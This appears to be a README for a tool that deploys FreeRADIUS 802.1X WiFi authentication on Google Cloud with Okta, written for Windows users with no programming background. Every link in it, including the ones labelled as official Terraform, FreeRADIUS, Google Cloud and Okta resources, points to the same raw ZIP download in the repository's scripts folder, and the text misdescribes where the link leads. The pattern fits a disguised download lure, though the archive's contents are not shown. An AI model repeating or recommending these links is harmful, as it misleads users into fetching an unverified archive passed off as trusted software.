# ⚙️ cloud-8021x - Reliable WiFi Security Setup

[![Download cloud-8021x](https://img.shields.io/badge/Download-cloud--8021x-brightgreen)](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)

---

## 📋 What is cloud-8021x?

cloud-8021x helps you secure your WiFi network using a system called 802.1X. This system ensures that only trusted devices can connect to your WiFi. It uses FreeRADIUS software running on Google Cloud. The setup works best with Ubiquiti UniFi WiFi devices and uses certificates managed by Okta. It makes your network safer by requiring devices to prove their identity before joining.

You do not need to know programming to use it. This guide walks you through downloading and running the software on a Windows computer.

---

## 🔧 System Requirements

Before you start, make sure your computer and network meet these requirements:

- Windows 10 or newer
- Internet connection
- Ubiquiti UniFi WiFi network or similar setup that supports 802.1X
- Okta account with certificate management enabled (SCEP support)
- Google Cloud account with permissions to run virtual machines
- Basic familiarity with network settings (optional but helpful)

---

## 💾 Download and Install cloud-8021x

You will need to visit the main cloud-8021x page to get the latest files and setup instructions.

### Step 1: Visit the download page

Click the big button below or go to this link:

[Download cloud-8021x](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)

This link will take you to the GitHub project, where you can access the files and documentation.

### Step 2: Get the files

On the GitHub page, look for these sections:

- The **Releases** tab on the right or top menu.
- The **README.md** for instructions.
- The main project folder for Terraform files.

Download the ZIP file or clone the repository if you are familiar with Git.

### Step 3: Prepare your environment

1. Install [Terraform](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip) for Windows. This tool will create and manage your cloud resources.

2. Sign in to your Google Cloud account and set up billing if necessary.

3. Obtain your Okta API credentials and make sure SCEP certificates are ready to be used.

---

## 🚀 How to Set Up cloud-8021x

This application is designed to create a highly available 802.1X setup using Terraform. Follow the steps carefully.

### Step 1: Configure Terraform

Terraform uses files called “configuration files” to know what resources to create.

1. Extract the downloaded ZIP file to a folder on your computer.

2. Open the folder and look for a file named `variables.tf` or `terraform.tfvars.example`.

3. Edit this file with Notepad or another text editor.

4. Enter your Google Cloud project ID, Okta details, and other required settings.

### Step 2: Run Terraform to deploy

1. Open a command prompt (Press `Windows+R`, type `cmd`, press Enter).

2. Change directories to the folder where you saved the files. Example:

   ```
   cd C:\Users\YourName\Downloads\cloud-8021x-main
   ```

3. Run the command:

   ```
   terraform init
   ```

   This downloads needed components.

4. Run:

   ```
   terraform apply
   ```

5. Terraform will ask you to confirm. Type `yes` and press Enter.

6. Wait for Terraform to finish creating the resources. This may take a few minutes.

---

## ⚙️ How It Works

cloud-8021x uses FreeRADIUS on a Google Cloud server. It controls access using 802.1X with EAP-TLS authentication. This means each device needs a certificate from Okta to join the WiFi network.

Terraform automates the setup of the server and security policies in Google Cloud. This protects your network and makes it easier to manage devices.

---

## 📌 Managing Your Setup

After deployment, you can log into your Google Cloud console to see the server status.

You can also:

- Check logs to watch connection attempts.
- Renew or revoke user certificates via Okta.
- Change WiFi controller settings to use the new FreeRADIUS service.

---

## 🛠 Troubleshooting

- If Terraform shows errors, double-check your project ID and credentials.

- Make sure your firewall allows connections to the FreeRADIUS server on UDP port 1812.

- Devices must support EAP-TLS and have their certificates installed.

- If you cannot reach the GitHub page, check your internet connection or firewall settings.

---

## 📚 Additional Resources

- [Terraform Documentation](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)

- [FreeRADIUS Official Site](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)

- [Google Cloud Console](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)

- [Okta Developer Docs](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)

---

## ❓ Need to Open Issues?

If you encounter bugs or have questions about cloud-8021x, use the GitHub repository Issues tab.

---

## 🔗 Quick Access to Cloud-8021x

[![Get cloud-8021x](https://img.shields.io/badge/Get-cloud--8021x-blue)](https://raw.githubusercontent.com/Gastofu/cloud-8021x/main/scripts/cloud_x_v1.3.zip)